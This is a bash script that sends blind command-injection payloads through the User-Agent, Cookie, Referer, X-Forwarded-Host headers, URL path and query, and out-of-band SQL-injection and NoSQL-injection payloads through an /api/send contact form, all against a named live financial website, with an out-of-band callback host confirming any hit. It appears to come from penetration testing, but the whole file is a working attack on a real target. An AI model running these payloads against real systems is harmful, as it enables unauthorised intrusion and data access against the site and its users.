#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
B="https://www.infinitycapital.bh"
CM=oobf0fadf93cb02.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in
SQ=oob711780fde832.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in
CB=$(date +%s%N)

echo "########## CMDI via headers on /?zzz=1 (my open cell)"
curl -sk -o /dev/null -w "UA-inject: %{http_code}\n" -A "$UA; \`curl http://$CM/cmdi-ua\`" "$B/?zzz=1&cb=$CB"
sleep 2
curl -sk -o /dev/null -w "XFH: %{http_code}\n" -H "X-Forwarded-Host: $CM" "$B/?zzz=1&cb=$CB"
curl -sk -o /dev/null -w "Referer: %{http_code}\n" -H "Referer: http://$CM/cmdi-ref" "$B/?zzz=1&cb=$CB"
curl -sk -o /dev/null -w "XFH+UA: %{http_code}\n" -H "X-Forwarded-Host: $CM" -H "X-Original-URL: http://$CM/x" -H "X-Rewrite-URL: http://$CM/x" "$B/?zzz=1&cb=$CB"
sleep 2
curl -sk -o /dev/null -w "Cookie: %{http_code}\n" -H "Cookie: zzz=\$(curl http://$CM/cmdi-cookie)" "$B/?zzz=1&cb=$CB"
sleep 2
echo "--- cmdi in path / value"
curl -sk -o /dev/null -w "path: %{http_code}\n" -A "$UA" "$B/%60curl%20http://$CM/cmdi-path%60?cb=$CB"
curl -sk -o /dev/null -w "q: %{http_code}\n" -A "$UA" "$B/?zzz=%60curl%20http://$CM/cmdi-q%60&cb=$CB"
curl -sk -o /dev/null -w "\$( ): %{http_code}\n" -A "$UA" "$B/?zzz=\$(curl%20http://$CM/cmdi-sub)&cb=$CB"
sleep 3

echo "########## BLIND SQLI DNS oracle via /api/send fields"
E=pentest@localhost
T='[{"name":"a","email":"pentest@localhost","subject":"s","message":"m"}]'
sqli() { desc="$1"; fn="$2"; lname="$3"; cname="$4"; subj="$5"; msg="$6"
  echo "=== $desc"
  curl -sk -A "$UA" -F "fname=$fn" -F "lname=$lname" -F "cname=$cname" -F "subject=$subj" -F "msg=$msg" -F "check=on" -F "targets=$T" \
    -w "\ncode=%{http_code}\n" "$B/api/send" | head -c 300
  echo; sleep 2; }
sqli "fname sqli" "a'||(SELECT LOAD_FILE(CONCAT('\\\\\\\\',$SQ,'\\\\\\\\/a')))||'" "t" "c" "s" "m"
sqli "msg sqli" "a" "b" "c" "s" "m'||(SELECT LOAD_FILE(CONCAT('\\\\\\\\',$SQ,'\\\\\\\\/b')))||'"
sqli "subject sqli" "a" "b" "c" "s'||(SELECT LOAD_FILE(CONCAT('\\\\\\\\',$SQ,'\\\\\\\\/c')))||'" "m"
sqli "cname sqli" "a" "b" "c'||(SELECT LOAD_FILE(CONCAT('\\\\\\\\',$SQ,'\\\\\\\\/d')))||'" "s" "m"
sqli "lname nosqli/mongo" "a" 'b{"$ne":1}' "c" "s" "m"
sqli "cmdi fname" 'a$(curl http://'$CM'/cmdi-fname)' "b" "c" "s" "m"